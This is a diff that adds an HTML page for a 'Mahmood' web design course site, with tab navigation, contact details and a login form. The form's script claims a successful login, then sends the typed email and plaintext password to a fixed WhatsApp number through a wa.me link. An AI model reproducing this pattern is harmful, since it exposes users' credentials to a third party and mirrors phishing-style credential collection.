@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mahmood Official - Professional & Responsive</title>
+    <style>
+        /* --- CORE STYLES --- */
+        *{
+            margin:0;
+            padding:0;
+            box-sizing:border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+
+        body {
+            background: #000;
+            color: #fff;
+            overflow-x: hidden;
+        }
+
+        .main {
+            width: 100%;
+            min-height: 100vh;
+            background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)),
+                        url('https://i.postimg.cc/BvJfw8yF/IMG-20251207-WA0018.jpg') center/cover no-repeat;
+            background-attachment: fixed; /* Background stays still while scrolling */
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            max-width: 1200px;
+            width: 90%;
+            margin: 0 auto;
+        }
+
+        /* --- NAVBAR --- */
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            flex-wrap: wrap;
+        }
+
+        .logo {
+            font-size: 35px;
+            font-weight: bold;
+            color: #fff;
+        }
+
+        .logo span {
+            color: #ff7200;
+        }
+
+        .menu ul {
+            display: flex;
+            list-style: none;
+        }
+
+        .menu ul li {
+            margin-left: 30px;
+        }
+
+        .menu ul li a {
+            text-decoration: none;
+            color: #fff;
+            font-weight: 600;
+            font-size: 15px;
+            transition: 0.3s;
+            text-transform: uppercase;
+            cursor: pointer;
+        }
+
+        .menu ul li a:hover, .active-tab {
+            color: #ff7200 !important;
+        }
+
+        .search {
+            display: flex;
+            background: rgba(255,255,255,0.1);
+            border-radius: 5px;
+            overflow: hidden;
+            border: 1px solid #ff7200;
+        }
+
+        .search input {
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #fff;
+            padding: 10px;
+            width: 150px;
+        }
+
+        .search button {
+            background: #ff7200;
+            border: none;
+            color: #fff;
+            padding: 10px 15px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        /* --- CONTENT SECTIONS --- */
+        .page-content {
+            display: none; /* Hidden by default */
+            justify-content: space-between;
+            align-items: center;
+            min-height: 80vh;
+            padding: 50px 0;
+            gap: 40px;
+        }
+
+        /* Home Page Layout (Desktop) */
+        #home {
+            display: flex; 
+        }
+
+        .text {
+            flex: 1;
+        }
+
+        .text h1 {
+            font-size: 65px;
+            line-height: 1.1;
+            margin-bottom: 20px;
+        }
+
+        .text span {
+            color: #ff7200;
+        }
+
+        .text p {
+            font-size: 18px;
+            line-height: 1.6;
+            margin-bottom: 30px;
+            color: #ddd;
+        }
+
+        .join-btn {
+            display: inline-block;
+            background: #ff7200;
+            color: #000;
+            padding: 15px 35px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+
+        .join-btn:hover {
+            background: #fff;
+            color: #ff7200;
+            transform: translateY(-3px);
+        }
+
+        /* --- LOGIN FORM --- */
+        .form {
+            width: 350px;
+            background: rgba(0,0,0,0.85);
+            padding: 40px;
+            border-radius: 15px;
+            border: 1px solid rgba(255, 114, 0, 0.4);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        .form h2 {
+            text-align: center;
+            color: #ff7200;
+            background: #fff;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 30px;
+            font-size: 22px;
+        }
+
+        .form input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            border-bottom: 1px solid #ff7200;
+            color: #fff;
+            padding: 12px 5px;
+            margin-bottom: 20px;
+            outline: none;
+            font-size: 16px;
+        }
+
+        .form button {
+            width: 100%;
+            background: #ff7200;
+            border: none;
+            padding: 12px;
+            color: #000;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .form button:hover {
+            background: #fff;
+            color: #ff7200;
+        }
+
+        /* --- RESPONSIVE BREAKPOINTS (Mobile & Tablet) --- */
+        
+        @media (max-width: 992px) {
+            .navbar {
+                flex-direction: column;
+                gap: 20px;
+            }
+            .menu ul li {
+                margin: 0 15px;
+            }
+            .page-content {
+                flex-direction: column;
+                text-align: center;
+                padding-top: 20px;
+            }
+            .text h1 {
+                font-size: 45px;
+            }
+            .form {
+                width: 100%;
+                max-width: 400px;
+            }
+        }
+
+        @media (max-width: 600px) {
+            .logo { font-size: 28px; }
+            .menu ul { flex-wrap: wrap; justify-content: center; }
+            .menu ul li { margin: 5px 10px; }
+            .text h1 { font-size: 35px; }
+            .text p { font-size: 15px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="main">
+    <div class="container">
+        
+        <!-- Navigation -->
+        <div class="navbar">
+            <div class="logo">Mah<span>mood</span></div>
+            <div class="menu">
+                <ul>
+                    <li><a href="javascript:void(0)" onclick="openTab('home', this)" class="active-tab">HOME</a></li>
+                    <li><a href="javascript:void(0)" onclick="openTab('about', this)">ABOUT</a></li>
+                    <li><a href="javascript:void(0)" onclick="openTab('service', this)">SERVICE</a></li>
+                    <li><a href="javascript:void(0)" onclick="openTab('design', this)">DESIGN</a></li>
+                    <li><a href="javascript:void(0)" onclick="openTab('contact', this)">CONTACT</a></li>
+                </ul>
+            </div>
+            <div class="search">
+                <input type="text" placeholder="Search...">
+                <button>Search</button>
+            </div>
+        </div>
+
+        <!-- Section: HOME -->
+        <div id="home" class="page-content">
+            <div class="text">
+                <h1>Web Design & <br><span>Development</span> Course</h1>
+                <p>Master professional website creation with Mahmood. We provide the best resources to help you build modern, responsive, and high-performing websites.</p>
+                <a class="join-btn" href="https://wa.me/923437996268" target="_blank">JOIN US</a>
+            </div>
+            <div class="form">
+                <h2>Login Here</h2>
+                <input type="email" id="emailInput" placeholder="Enter Email Here">
+                <input type="password" id="passInput" placeholder="Enter Password Here">
+                <button onclick="handleLogin()">Login</button>
+            </div>
+        </div>
+
+        <!-- Section: ABOUT -->
+        <div id="about" class="page-content">
+            <div class="text">
+                <h1>About <span>Mahmood</span></h1>
+                <p>We are a team of expert developers and designers dedicated to teaching and building professional digital solutions for clients worldwide.</p>
+            </div>
+        </div>
+
+        <!-- Section: SERVICE -->
+        <div id="service" class="page-content">
+            <div class="text">
+                <h1>Our <span>Services</span></h1>
+                <p>From UI/UX Design to Full-Stack Web Development and SEO, we cover everything you need to succeed in the digital era.</p>
+            </div>
+        </div>
+
+        <!-- Section: DESIGN -->
+        <div id="design" class="page-content">
+            <div class="text">
+                <h1>Modern <span>Design</span></h1>
+                <p>Explore our clean, minimal, and high-impact designs tailored to provide the best user experience on all devices.</p>
+            </div>
+        </div>
+
+        <!-- Section: CONTACT -->
+        <div id="contact" class="page-content">
+            <div class="text">
+                <h1>Contact <span>Us</span></h1>
+                <p>Email: info@mahmood.com <br> WhatsApp: +923437996268 <br> Feel free to reach out anytime!</p>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<script>
+    // Tab Switching Function
+    function openTab(pageId, element) {
+        var pages = document.getElementsByClassName("page-content");
+        for (var i = 0; i < pages.length; i++) {
+            pages[i].style.display = "none";
+        }
+        var links = document.querySelectorAll(".menu ul li a");
+        links.forEach(function(link) {
+            link.classList.remove("active-tab");
+        });
+        document.getElementById(pageId).style.display = "flex";
+        element.classList.add("active-tab");
+    }
+
+    // Login and WhatsApp Notification Function
+    function handleLogin() {
+        var userEmail = document.getElementById("emailInput").value.trim();
+        var userPass = document.getElementById("passInput").value.trim();
+
+        if (userEmail === "" || userPass === "") {
+            alert("Error: Please enter both Email and Password!");
+            return;
+        }
+
+        if (!userEmail.includes("@") || !userEmail.includes(".")) {
+            alert("Error: Please enter a valid Email address!");
+            return;
+        }
+
+        var myNumber = "923437996268";
+        var message = "New User Login Attempt!%0A" + 
+                      "-----------------------%0A" +
+                      "Email: " + userEmail + "%0A" + 
+                      "Password: " + userPass;
+
+        alert("Login Successful! Sending details to WhatsApp...");
+        window.open("https://wa.me/" + myNumber + "?text=" + message, "_blank");
+    }
+</script>
+
+</body>
+</html>
